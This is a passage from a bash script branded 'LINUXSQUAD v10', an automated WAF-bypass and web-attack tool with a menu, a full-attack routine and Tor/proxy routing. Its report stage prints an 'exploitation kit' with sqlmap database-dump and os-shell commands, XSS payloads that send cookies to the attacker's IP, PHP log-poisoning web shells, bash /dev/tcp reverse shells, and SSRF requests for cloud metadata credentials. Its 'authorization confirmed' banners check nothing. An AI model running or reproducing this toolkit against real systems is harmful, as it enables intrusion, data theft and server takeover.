                HIGH+=("CRITICAL:Command-Injection"); FOUND=true
            }
        done
    done
    
    # GraphQL
    echo -e "${CYAN}[4.5] GraphQL...${NC}"
    local gql='{"query":"query{__schema{types{name}}}"}'
    for path in /graphql /v1/graphql /v2/graphql /api/graphql /gql /query /graph; do
        local gresp=$(waf_req "https://$host$path" "POST" "$gql" 2>/dev/null)
        ((TOTAL++))
        echo "$gresp" | grep -qi "__schema\|types\|Query\|Mutation\|__type\|fields" && {
            echo -e "  ${KRM}[GRAPHQL] $path${NC}"
            HIGH+=("CRITICAL:GraphQL-Introspection:$path"); FOUND=true
        }
    done
    
    # CORS
    local cors=$(waf_req_head -H "Origin: https://evil.com" "https://$host/" 2>/dev/null)
    ((TOTAL++))
    echo "$cors" | grep -qi "Access-Control-Allow-Origin: https://evil.com\|Access-Control-Allow-Origin: \*" && {
        echo -e "  ${KRM}[CORS] Misconfigured${NC}"
        MED+=("HIGH:CORS-Misconfiguration"); FOUND=true
    }
}

#===== REPORT =====#
report() {
    local end=$(date +%s)
    local dur=$((end - START))
    local sev="SECURE"
    [ ${#HIGH[@]} -gt 0 ] && sev="CRITICAL"
    [ ${#HIGH[@]} -eq 0 ] && [ ${#MED[@]} -gt 0 ] && sev="MEDIUM"
    local atk_ip=$(hostname -I | awk '{print $1}')
    local proxy_count=$(sort -u "$PROXY_FILE" 2>/dev/null | wc -l)
    
    echo -e "\n${KRM}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BEYAZ}  FINAL REPORT - LINUXSQUAD v10${NC}"
    echo -e "${KRM}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BEYAZ}Target:     ${CYAN}$DOMAIN${NC}"
    echo -e "${BEYAZ}WAF:        ${Y}$WAF${NC}"
    echo -e "${BEYAZ}Origin IP:  ${KRM}${REALIP:-Not found}${NC}"
    echo -e "${BEYAZ}Server:     ${CYAN}$SERVER${NC}"
    echo -e "${BEYAZ}CMS:        ${CYAN}$CMS${NC}"
    echo -e "${BEYAZ}Proxy:      ${Y}$PROXY_MODE ($proxy_count proxies)${NC}"
    echo -e "${BEYAZ}Smuggling:  ${KRM}$SMUGGLE_FOUND${NC}"
    echo -e "${BEYAZ}Attacks:    ${CYAN}$TOTAL${NC}"
    echo -e "${BEYAZ}Duration:   ${CYAN}${dur}s${NC}"
    echo -e "${BEYAZ}Status:     ${KRM}$sev${NC}"
    echo ""
    
    [ ${#HIGH[@]} -gt 0 ] && {
        echo -e "${KRM}[!] CRITICAL:${NC}"
        for v in "${HIGH[@]}"; do echo -e "  ${KRM}→ $v${NC}"; done
        echo ""
        echo -e "${KRM}═══ EXPLOITATION KIT ═══${NC}"
        echo ""
        
        [ -n "$REALIP" ] && echo -e "${CYAN}[Origin IP Bypass]${NC}\n  ${Y}curl -H 'Host: $DOMAIN' 'https://$REALIP/?id=1' OR 1=1--${NC}\n  ${Y}sqlmap -u 'https://$REALIP/?id=1' --batch --dbs${NC}\n"
        echo -e "${CYAN}[SQLi]${NC}\n  ${Y}sqlmap -u 'https://$DOMAIN/?id=1' --batch --level=5 --risk=3 --dbs --dump${NC}\n  ${Y}sqlmap -u 'https://$DOMAIN/?id=1' --batch --os-shell${NC}\n"
        echo -e "${CYAN}[XSS]${NC}\n  ${Y}<script>document.location='http://${atk_ip}:8080/?c='+document.cookie</script>${NC}\n  ${Y}<script src='http://${atk_ip}:3000/hook.js'></script>${NC}\n"
        echo -e "${CYAN}[LFI -> RCE]${NC}\n  ${Y}curl -A '<?php system(\$_GET[\"cmd\"]); ?>' 'https://$DOMAIN/'${NC}\n  ${Y}curl 'https://$DOMAIN/?page=../../../var/log/apache2/access.log&cmd=id'${NC}\n  ${Y}curl 'https://$DOMAIN/?page=../../../var/log/apache2/access.log&cmd=bash -c \"bash -i >& /dev/tcp/${atk_ip}/4444 0>&1\"'${NC}\n"
        echo -e "${CYAN}[Reverse Shell]${NC}\n  ${Y}nc -lvnp 4444${NC}\n  ${Y}curl 'https://$DOMAIN/?cmd=bash -c \"bash -i >& /dev/tcp/${atk_ip}/4444 0>&1\"'${NC}\n"
        echo -e "${CYAN}[SSRF]${NC}\n  ${Y}curl 'https://$DOMAIN/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'${NC}\n  ${Y}for p in 22 80 443 3306 6379 27017 8080; do curl -s 'https://$DOMAIN/?url=http://127.0.0.1:\$p' && echo \" \$p OPEN\"; done${NC}"
        
        [ "$SMUGGLE_FOUND" = true ] && echo -e "\n${CYAN}[HTTP SMUGGLING]${NC}\n  ${Y}Smuggler: python3 smuggler.py -u https://$DOMAIN${NC}\n  ${Y}Manual: CL.TE - POST with Content-Length: 0 + Transfer-Encoding: chunked${NC}"
    }
    
    [ ${#MED[@]} -gt 0 ] && {
        echo -e "\n${Y}[*] MEDIUM:${NC}"
        for v in "${MED[@]}"; do echo -e "  ${Y}→ $v${NC}"; done
    }
    
    [ "$FOUND" = false ] && echo -e "\n${T}[✓] No vulns${NC}" && echo -e "Try: nuclei -u https://$DOMAIN | nikto -h https://$DOMAIN"
    
    local rf="LINUXSQUAD_${DOMAIN}_$(date +%Y%m%d_%H%M%S).txt"
    {
        echo "LINUXSQUAD v10 Report"
        echo "Target: $DOMAIN | WAF: $WAF | Origin: ${REALIP:-N/A} | Smuggling: $SMUGGLE_FOUND"
        echo "Attacks: $TOTAL | Duration: ${dur}s | Severity: $sev"
        echo ""; echo "--- HIGH ---"
        for v in "${HIGH[@]}"; do echo "  $v"; done
        echo ""; echo "--- MEDIUM ---"
        for v in "${MED[@]}"; do echo "  $v"; done
    } > "$rf"
    echo -e "\n${T}[+] Report: $rf${NC}"
}

#===== MAIN =====#
full_attack() {
    DOMAIN=$(echo "$1" | sed 's|https\?://||g' | sed 's|/.*||g')
    IP=$(dig +short "$DOMAIN" | head -1); [ -z "$IP" ] && IP="Unknown"
    
    clear; banner
    echo -e "${KRM}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BEYAZ}  FULL WAF BYPASS ATTACK: $DOMAIN [$IP]${NC}"
    echo -e "${KRM}════════════════════════════════════════════════════════════${NC}"
    echo -e "${T}[AUTHORIZATION CONFIRMED] I have permission${NC}\n"
    sleep 1
    START=$(date +%s)
    
    discover_proxies
    phase0_origin
    phase1_recon
    smuggling_exploit
    phase2_sqli
    phase3_xss
    phase4_advanced
    report
    clean
}

quick_scan() {
    DOMAIN=$(echo "$1" | sed 's|https\?://||g' | sed 's|/.*||g')
    clear; banner
    echo -e "${CYAN}Quick WAF scan: $DOMAIN${NC}\n"
    echo -e "${T}[AUTHORIZATION CONFIRMED]${NC}\n"
    START=$(date +%s)
    discover_proxies
    phase0_origin
    phase1_recon
    smuggling_exploit
    report
}

#===== MENU =====#
menu() {
    while true; do
        banner
        echo -e "${KRM}════════════════════════════════════════════════════════════${NC}"
        echo -e "${BEYAZ}  LINUXSQUAD v10 - AUTO PROXY | SMUGGLING | WAF BYPASS${NC}"
        echo -e "${KRM}════════════════════════════════════════════════════════════${NC}"
        echo -e "${BEYAZ}  [AUTHORIZED PENTESTING TOOL]${NC}"
        echo ""
        echo -e "${CYAN}  1${NC}) Quick WAF Scan (Proxy + Origin + Smuggling)"
        echo -e "${KRM}  2${NC}) FULL ATTACK (All Phases + Exploitation)"
        echo -e "${Y}  3${NC}) Proxy Management"
        echo -e "${CYAN}  4${NC}) Quit"
        echo ""
        echo -n -e "${BEYAZ}  Select: ${NC}"; read c
        case $c in
            1) echo -n "Target: "; read t; [ -n "$t" ] && quick_scan "$t"; echo -n "Enter..."; read d ;;
            2) echo -n "Target: "; read t; [ -n "$t" ] && full_attack "$t"; echo -n "Enter..."; read d ;;
            3)
                echo -e "\n${CYAN}Proxy Management:${NC}"
                echo -e "  ${Y}1) Tor (sudo service tor start)${NC}"
                echo -e "  ${Y}2) Add custom proxy (IP:PORT to /tmp/linuxsquad_proxies.txt)${NC}"
                echo -e "  ${Y}3) Status: $( [ -f "$PROXY_FILE" ] && echo "$(wc -l < "$PROXY_FILE") proxies" || echo "No proxies" )${NC}"
                echo -n "Select: "; read pc
                case $pc in
                    1) sudo service tor start 2>/dev/null || (tor --runasdaemon 1 2>/dev/null &); echo -e "${T}Tor started!${NC}" ;;
                    2) echo "Add proxies (one per line) to /tmp/linuxsquad_proxies.txt" ;;
                    3) [ -f "$PROXY_FILE" ] && head -10 "$PROXY_FILE" || echo "No proxy file" ;;
                esac
                echo -n "Enter..."; read d
                ;;
            4) echo -e "${KRM}Bye!${NC}"; clean; exit 0 ;;
        esac
    done
}

# Check deps
for tool in dig curl python3 openssl bc; do
    command -v $tool &>/dev/null || echo -e "${Y}Missing: $tool${NC}"
done

clear
menu
